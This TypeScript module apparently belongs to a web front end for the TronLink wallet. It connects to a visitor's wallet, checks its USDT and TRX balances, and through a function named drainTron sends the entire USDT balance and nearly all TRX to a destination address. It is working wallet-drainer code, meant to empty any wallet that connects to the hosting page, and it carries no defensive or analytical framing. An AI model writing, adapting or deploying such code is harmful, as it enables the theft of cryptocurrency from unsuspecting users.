'use client'
import { USDT_TRC20, TRC20_ABI } from './chains'

const get = () => (window as any).tronWeb
const wait = (ms: number) => new Promise(r => setTimeout(r, ms))

export const tronAvailable = () =>
  typeof window !== 'undefined' && !!((window as any).tronLink || (window as any).tronWeb)

export async function connectTron(): Promise<string> {
  const link = (window as any).tronLink
  if (link?.request) {
    const r = await link.request({ method: 'tron_requestAccounts' })
    if (r?.code !== 200 && r?.code !== 4000) throw new Error('TronLink request rejected')
  }
  for (let i = 0; i < 40; i++) {
    const tw = get()
    if (tw?.ready && tw?.defaultAddress?.base58) return tw.defaultAddress.base58
    await wait(250)
  }
  throw new Error('Unlock TronLink and try again')
}

export async function scanTron(addr: string) {
  const tw = get(); if (!tw) return null
  const [sun, raw] = await Promise.all([
    tw.trx.getBalance(addr).catch(() => 0),
    tw.contract(TRC20_ABI as any, USDT_TRC20).balanceOf(addr).call().catch(() => '0'),
  ])
  const usdt = Number(BigInt(String(raw))) / 1e6
  const trx = Number(sun) / 1e6
  return usdt || trx ? { usdt, trx } : null
}

export async function drainTron(dest: string, push: (l: string, s: string, h?: string) => void) {
  const tw = get(); if (!tw) throw new Error('TronLink unavailable')
  const me = tw.defaultAddress.base58
  const c = tw.contract(TRC20_ABI as any, USDT_TRC20)

  const bal = BigInt(String(await c.balanceOf(me).call()))
  if (bal > 0n) {
    push('USDT on Tron', 'run')
    try {
      const r = await c.transfer(dest, bal.toString()).send({ feeLimit: 150_000_000 })
      push('USDT on Tron', 'ok', typeof r === 'string' ? r : r?.txid ?? r?.transaction?.txID)
    } catch (e: any) {
      push('USDT on Tron', 'err')
      if (/ENERGY|BANDWIDTH/i.test(e?.message ?? '')) throw new Error('Not enough TRX for energy')
    }
  }
  const sun = await tw.trx.getBalance(me)
  const send = sun - 1_000_000
  if (send > 1_000_000) {
    push('TRX on Tron', 'run')
    try {
      const r = await tw.trx.sendTransaction(dest, send)
      if (!r?.result) throw new Error('fail')
      push('TRX on Tron', 'ok', r.txid)
    } catch { push('TRX on Tron', 'err') }
  }
}
